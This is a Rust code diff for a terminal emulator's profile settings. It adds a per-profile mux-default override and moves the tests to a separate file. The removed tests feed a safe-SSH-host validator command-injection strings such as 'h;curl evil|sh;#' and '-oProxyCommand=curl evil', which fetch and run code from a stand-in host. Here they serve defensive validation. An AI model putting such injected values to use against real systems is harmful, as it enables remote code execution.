@@ -115,6 +115,12 @@ pub struct Profile {
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub mux_session_name: Option<String>,
 
+    /// Per-profile override of `use_mux_by_default`: `Some(false)` keeps
+    /// this profile's tabs local even when the global default routes new
+    /// tabs through par-mux; `None` inherits the global default.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub use_mux_by_default: Option<bool>,
+
     /// How to connect: control mode (full integration) or normal (plain tmux in PTY).
     #[serde(default, skip_serializing_if = "TmuxConnectionMode::is_control_mode")]
     pub tmux_connection_mode: TmuxConnectionMode,
@@ -391,6 +397,7 @@ impl Profile {
             mux_session_patterns: Vec::new(),
             tmux_session_name: None,
             mux_session_name: None,
+            use_mux_by_default: None,
             tmux_connection_mode: TmuxConnectionMode::default(),
             directory_patterns: Vec::new(),
             badge_text: None,
@@ -437,6 +444,7 @@ impl Profile {
             mux_session_patterns: Vec::new(),
             tmux_session_name: None,
             mux_session_name: None,
+            use_mux_by_default: None,
             tmux_connection_mode: TmuxConnectionMode::default(),
             directory_patterns: Vec::new(),
             badge_text: None,
@@ -740,59 +748,5 @@ impl Default for Profile {
 }
 
 #[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn safe_hosts_are_accepted() {
-        for host in [
-            "example.com",
-            "prod.internal",
-            "10.0.0.4",
-            "fe80::1",
-            "host-1_a.local",
-        ] {
-            assert!(is_safe_ssh_host(host), "expected {host:?} to be accepted");
-        }
-    }
-
-    #[test]
-    fn shell_metacharacters_are_rejected() {
-        for host in [
-            "h;curl evil|sh;#",
-            "host;id",
-            "host|id",
-            "host&id",
-            "host$(id)",
-            "host`id`",
-            "host$IFS",
-            "host<in",
-            "host>out",
-        ] {
-            assert!(!is_safe_ssh_host(host), "expected {host:?} to be rejected");
-        }
-    }
-
-    #[test]
-    fn control_characters_and_leading_dash_are_rejected() {
-        assert!(!is_safe_ssh_host("host\nid"));
-        assert!(!is_safe_ssh_host("host\rid"));
-        assert!(!is_safe_ssh_host("host\0id"));
-        assert!(!is_safe_ssh_host("host\tid"));
-        assert!(!is_safe_ssh_host("-oProxyCommand=curl evil"));
-    }
-
-    #[test]
-    fn unsafe_ssh_host_blocks_argv_and_is_reported_by_validate() {
-        let mut profile = Profile::new("evil");
-        profile.ssh_host = Some("h;curl evil|sh;#".to_string());
-
-        assert!(profile.ssh_command_args().is_none());
-        assert!(
-            profile
-                .validate()
-                .iter()
-                .any(|w| w.contains("is unsafe (SEC-007)"))
-        );
-    }
-}
+#[path = "profile_tests.rs"]
+mod tests;
